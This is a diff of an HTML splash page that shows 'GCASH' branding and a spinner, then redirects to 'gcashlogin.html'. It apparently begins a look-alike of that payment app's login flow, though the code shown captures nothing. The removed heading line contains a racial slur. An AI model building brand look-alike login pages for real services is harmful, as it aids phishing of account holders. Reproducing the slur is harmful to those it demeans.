@@ -15,7 +15,7 @@
     body {
       background-color: #007dfe;
     }
-      .container {
+    .container {
       margin: auto 0 ;
       position: relative;
       top: 30vh;
@@ -30,22 +30,47 @@
     }
     h2 {
       color: white;
-      margin-left: 35px;
+      position: relative;
+      left: 10vh;
       
-      font-size: 45px;
+      font-size: 125px;
       font-family: arial;
     }
+    .loading-circle {
+  border: 8px solid rgba(0, 0, 0, 0.01);
+  border-top: 8px solid white;
+  border-radius: 50%;
+  width: 50px;
+  position: relative;
+  height: 50px;
+  left : 20vh;
+  animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+  0% {
+    transform: rotate(0deg);
+  }
+  100% {
+    transform: rotate(360deg);
+  }
+}
+
   </style>
   <body>
     <div class="container">
    
-      <img src="hi.jpeg" alt="" class="logo"/>
-         <h2>Nigga</h2><br><br>
-       
+      <img src="images/logo.png" alt="" class="logo"/>
+         <h2>GCASH</h2><br><br>
+         <div class="loading-circle"></div>
 
     </div>
   </body>
-    
-
+  <script type="text/javascript" charset="utf-8">
+    <script type="text/javascript" charset="utf-8">
+    setTimeout(function() {
+       window.location.href= "gcashlogin.html";
+    }, 2000);
   </script>
-</html>
+  </script>
+  </html>
